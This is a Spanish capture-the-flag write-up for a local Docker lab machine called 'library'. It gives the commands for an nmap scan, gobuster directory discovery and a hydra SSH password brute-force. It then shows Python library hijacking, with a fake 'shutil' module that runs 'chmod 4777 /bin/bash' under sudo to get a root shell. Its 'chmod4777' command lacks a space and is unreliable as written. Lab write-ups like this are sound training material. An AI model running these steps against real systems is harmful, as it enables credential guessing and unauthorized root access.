---
Maquina: library
SO: Linux
Explotación: Análisis de imágenes y web
Escala_privs: Permisos sudo
Dificultad: Fácil
tags:
  - maquina
  - web_discovery
  - analisis_imagen
  - linux
  - escala_privs
  - ssh
  - web
---
## Reconocimiento

1. **Explorar los puerto abiertos del docker**: 

```bash 
nmap -p- --open --min-rate 5000 -sVC -Pn 172.17.0.2
```

![[Pasted image 20241102172908.png]]

2. **Ver la pagina web ubicada en el puerto 80**:

![[Pasted image 20241102173026.png]]

Como se puede apreciar es la página por defecto de apache. Vamos a intentar ver si hay alguna web adicional mediante Gobuster y nos encontramos lo siguiente:

```bash
gobuster dir -u http://172.17.0.2 -w /snap/seclists/current/Discovery/Web-Content/directory-list-2.3-big.txt -x .php,.py,.js,.txt
```

![[Pasted image 20241102173228.png]]

Vemos un código interesante si accedemos al index.php -> JIFGHDS87GYDFIGD

![[Pasted image 20241102173256.png]]

Podría ser muchas cosas... un mensaje cifrado, una passwd... vamos a investigar un poco mas a ver si descubrimos de que se trata.

```bash
hydra -L /snap/seclists/current/Usernames/xato-net-10-million-usernames.txt -p JIFGHDS87GYDFIGD ssh://172.17.0.2
```

Parece que si que era una contraseña de un usuario...

![[Pasted image 20241102191133.png]]

Vamos a intentar iniciar sesión en el SSH yyyyy

![[Pasted image 20241102181854.png]]

Vamos a explorar los permisos y directorios importantes...

```bash
sudo -l
```

![[Pasted image 20241102181946.png]]

Pues vamos a probar a ver si gtfo bins nos da algún consejillo jiji...

![[Pasted image 20241102182242.png]]

ooooooooooo... Carlos como pudiste crearme estas ilusiones :c

Igualmente podemos intentar probar con el código que hay en opr/script.py

```python
import shutil

def copiar_archivo(origen, destino):
    shutil.copy(origen, destino)
    print(f'Archivo copiado de {origen} a {destino}')

if __name__ == '__main__':
    origen = '/opt/script.py'
    destino = '/tmp/script_backup.py'
    copiar_archivo(origen, destino)

```

Como parece que toma la libreria shutil para realizar la opción de copiar podemos generar la nuestra propia en /opt/ y que la ejecute nada más pedirle que realice el script.py. Para ello vamos a crear la siguiente librería en /opt/.

```python
import os
os.system("chmod4777 /bin/bash")
```

Ahora tan solo tenemos que ejecutar el comando en el que tenemos privilegios de root.

```bash
sudo -u root python3 /opt/script.py
```

Y ver si con suerte ha surtido efecto

![[Pasted image 20241102190942.png]]

Parece ser que tenemos vía libre para ejecutar /bin/bash como si fueramos root.

```bash
/bin/bash -p
```

Y sorpresa!

![[Pasted image 20241102191057.png]]
